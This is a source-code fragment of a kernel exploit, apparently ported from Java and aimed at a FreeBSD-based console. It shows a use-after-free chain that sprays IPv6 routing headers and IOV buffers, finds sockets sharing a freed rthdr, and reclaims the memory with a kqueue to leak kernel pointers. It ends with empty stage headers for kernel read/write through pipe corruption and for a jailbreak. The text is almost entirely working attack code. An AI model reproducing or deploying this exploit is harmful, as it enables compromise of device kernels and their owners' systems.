if (triplets[1] === -1) {
  throw new Error('Failed to find triplet[1]')
}
log('Found triplet[1]: socket[' + triplets[1] + ']')

// Release one IOV spray (matching Java line 487-494)
log('Releasing one IOV spray before finding triplet[2]...')
doIOVSpray()

// Find triplet[2] - a fourth socket sharing the same rthdr
log('Finding triplet[2]...')
triplets[2] = findTriplet(triplets[0]!, triplets[1]!)
if (triplets[2] === -1) {
  throw new Error('Failed to find triplet[2]')
}
log('Found triplet[2]: socket[' + triplets[2] + ']')
log('Triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')

// ============================================================================
// Stage 4: Leak kqueue structure
// ============================================================================

// Free one rthdr to make room for kqueue (use triplets not twins)
setsockopt(ipv6_sockets[triplets[1]!]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
log('Freed rthdr on socket[' + triplets[1] + ']')

// Get kqueue syscall (0x16A = 362)
fn.register(0x16A, 'kqueue_sys', [], 'bigint')
const kqueue_sys = fn.kqueue_sys as () => BigInt

// Loop until we reclaim with kqueue structure
let kq_fd = -1
let kq_fdp = new BigInt(0, 0)
const max_attempts = 100

for (let attempt = 0; attempt < max_attempts; attempt++) {
  // Create kqueue (auto-throws on error)
  kq_fd = kqueue_sys().lo

  // Leak with triplets[0]
  mem.view(leak_len_buf).setUint32(0, 0x100, true)
  getsockopt(ipv6_sockets[triplets[0]!]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

  // Check for kqueue signature at offset 0x08
  const sig = mem.view(leak_rthdr_buf).getUint32(0x08, true)
  if (sig === 0x1430000) {
    // Found kqueue! Extract kq_fdp at offset 0xA8
    kq_fdp = mem.view(leak_rthdr_buf).getBigInt(0xA8, true)
    log('Found kqueue structure after ' + (attempt + 1) + ' attempts')
    log('kq_fdp: ' + kq_fdp.toString())
    break
  }

  // Not kqueue yet, close and retry
  close_sys(kq_fd)
}

if (kq_fdp.lo === 0 && kq_fdp.hi === 0) {
  throw new Error('Failed to leak kqueue after ' + max_attempts + ' attempts')
}

// Close kqueue to free the buffer
close_sys(kq_fd)
log('Closed kqueue fd ' + kq_fd)

// Find new triplet[1] to replace the one we freed
log('Finding new triplet[1] after kqueue leak...')
triplets[1] = findTriplet(triplets[0]!, triplets[2]!)
if (triplets[1] === -1) {
  throw new Error('Failed to find new triplet[1] after kqueue leak')
}
log('Found new triplet[1]: socket[' + triplets[1] + ']')

// Cleanup buffers
// mem.free(store_addr)
// mem.free(rthdr_buf)
// mem.free(optlen_buf)
// mem.free(set_buf)
// mem.free(clear_buf)
// mem.free(leak_rthdr_buf)
// mem.free(leak_len_buf)

// ============================================================================
// STAGE 4: Leak kqueue structure
// ============================================================================

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak
// ============================================================================
